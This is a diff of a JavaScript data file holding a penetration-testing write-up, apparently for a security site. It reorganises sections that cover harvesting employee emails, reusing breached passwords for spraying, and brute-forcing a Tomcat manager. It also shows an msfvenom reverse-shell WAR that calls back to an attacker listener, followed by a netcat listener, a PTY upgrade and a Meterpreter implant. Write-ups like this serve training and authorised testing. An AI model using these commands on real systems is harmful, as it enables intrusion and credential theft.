@@ -13652,10 +13652,7 @@ const writeups = [
       },
       {
         heading: "4. OSINT — Human Intelligence & Credential Exposure",
-        paragraphs: [
-          "Technical enumeration tells you about systems. OSINT tells you about people — and people are almost always the weakest link. LinkedIn, GitHub, Pastebin, HaveIBeenPwned, and breach databases give us a human map of the organization that no port scanner can produce.",
-          "We enumerate employees on LinkedIn: job titles, tenure, technology stacks they mention in their profiles, and the email format the company uses (it's always in the first few employee profiles if you know where to look). Here it's firstname.lastname@targetcorp.com. We generate a candidate employee list and run it through LinkedIn's people search, pulling around 340 employee names.",
-        ],
+        paragraphs: [ ],
         codeBlock: {
           language: "bash",
           code: `# Generate email permutations from scraped employee names
@@ -13686,11 +13683,13 @@ const writeups = [
     --report-path gitleaks_report.json`,
         },
         paragraphs: [
+          "Technical enumeration tells you about systems. OSINT tells you about people — and people are almost always the weakest link. LinkedIn, GitHub, Pastebin, HaveIBeenPwned, and breach databases give us a human map of the organization that no port scanner can produce.",
+          "We enumerate employees on LinkedIn: job titles, tenure, technology stacks they mention in their profiles, and the email format the company uses (it's always in the first few employee profiles if you know where to look). Here it's firstname.lastname@targetcorp.com. We generate a candidate employee list and run it through LinkedIn's people search, pulling around 340 employee names.",
           "TruffleHog surfaces gold: a developer committed an AWS access key to a public GitHub repository 8 months ago. The key has since been revoked, but the repository also contains internal configuration files referencing internal hostnames, VPN gateway addresses, and — in a .env file pushed by mistake — a password pattern the dev team appears to use across multiple services.",
           "h8mail correlates three executive email addresses against a 2022 LinkedIn breach. One appears with a plaintext password. We note the pattern for wordlist building — we won't use it to compromise personal accounts, only to inform our corporate spraying strategy. Dictionary words plus special characters plus a year. Classic.",
         ],
         imagePlaceholder: {
-          caption: "Fig 2: TruffleHog v3 scanning a GitHub org — verified secrets flagged with a green checkmark, each one traced to the exact commit hash, file path, and line number",
+          caption: "OSINT — Human Intelligence & Credential Exposure",
           src: "https://redbotsecurity.com/wp-content/uploads/2024/03/open-source-intelligence-OSINT-Penetration-Testing.jpg",
         },
       },
@@ -13699,6 +13698,8 @@ const writeups = [
         paragraphs: [
           "With recon complete, we have several potential entry points: the exposed Tomcat manager, the Citrix NetScaler RCE, a VPN portal that might be vulnerable to credential stuffing, and a web application at app.targetcorp.com with an interesting login form. We prioritize by likelihood of success and noise level — start quiet, escalate only if needed.",
           "We begin with password spraying the VPN portal. We have ~340 valid email addresses and a hypothesis about the password pattern. The key discipline here is spray rate: one attempt per account per 30 minutes stays well under any reasonable lockout policy. Spray too fast and you lock out half the company and light up the SOC. Spray too slow and the engagement window closes.",
+          "The Tomcat manager is a hit. Credentials tomcat:s3cr3t! grant access to the Tomcat web application manager. This is textbook: a forgotten development server left internet-facing with default credentials. From here, deploying a malicious WAR file is a three-click operation in the browser or a single curl command.",
+          "We have a shell. It's running as the tomcat service account on a Linux host. The connection isn't particularly stable so we immediately upgrade to a full PTY and then drop a more reliable Meterpreter implant before doing anything else.",
         ],
         codeBlock: {
           language: "bash",
@@ -13728,14 +13729,10 @@ const writeups = [
     -P /usr/share/wordlists/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \\
     -M http -m AUTH_TYPE:BASIC \\
     -m URI:/manager/html \\
-    -t 1 -T 1 -f`,
-        },
-        paragraphs: [
-          "The Tomcat manager is a hit. Credentials tomcat:s3cr3t! grant access to the Tomcat web application manager. This is textbook: a forgotten development server left internet-facing with default credentials. From here, deploying a malicious WAR file is a three-click operation in the browser or a single curl command.",
-        ],
-        codeBlock: {
-          language: "bash",
-          code: `# Generate a reverse shell payload as a WAR file
+    -t 1 -T 1 -f
+
+========================
+# Generate a reverse shell payload as a WAR file
   msfvenom -p java/jsp_shell_reverse_tcp \\
     LHOST=10.10.10.5 LPORT=4444 \\
     -f war -o shell.war
@@ -13747,14 +13744,10 @@ const writeups = [
   
   # Set up listener, then trigger execution
   nc -lvnp 4444
-  curl http://192.0.2.82:8080/shell/`,
-        },
-        paragraphs: [
-          "We have a shell. It's running as the tomcat service account on a Linux host. The connection isn't particularly stable so we immediately upgrade to a full PTY and then drop a more reliable Meterpreter implant before doing anything else.",
-        ],
-        codeBlock: {
-          language: "bash",
-          code: `# Upgrade the basic netcat shell to an interactive PTY
+  curl http://192.0.2.82:8080/shell/
+
+========================
+          # Upgrade the basic netcat shell to an interactive PTY
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   # Ctrl+Z → stty raw -echo; fg → export TERM=xterm
   
